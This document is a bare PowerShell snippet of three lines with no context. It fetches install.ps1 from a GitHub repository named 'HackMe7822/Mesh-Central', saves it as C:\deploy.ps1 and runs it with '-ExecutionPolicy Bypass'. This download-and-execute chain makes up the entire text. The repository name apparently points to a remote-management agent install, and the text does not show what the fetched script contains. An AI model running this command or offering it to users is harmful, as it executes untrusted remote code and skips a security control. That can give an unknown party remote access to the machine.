$u = (Invoke-WebRequest "https://api.github.com/repos/HackMe7822/Mesh-Central/contents/install.ps1" -UseBasicParsing | ConvertFrom-Json).download_url
Invoke-WebRequest $u -OutFile "C:\deploy.ps1" -UseBasicParsing
powershell -ExecutionPolicy Bypass -File "C:\deploy.ps1"
